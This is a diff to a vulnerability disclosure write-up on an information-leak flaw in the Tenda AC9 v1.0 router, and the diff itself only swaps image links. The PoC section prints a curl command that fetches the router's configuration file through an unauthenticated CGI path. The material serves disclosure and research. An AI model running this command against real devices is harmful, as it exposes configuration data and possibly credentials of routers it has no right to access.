@@ -14,6 +14,8 @@ A data disclosure vulnerability exists in the Tenda ac9 v1.0 router with firmwar
 
 ---
 ### **PoC**
-![[TENDA/AC9信息泄露/img/1.png]]
+
+![1](./img/45.png)
+
 `curl http://192.168.0.1:80/cgi-bin/DownloadCfg.jpg`
-![[2.png]]
+![2](./img/46.png)
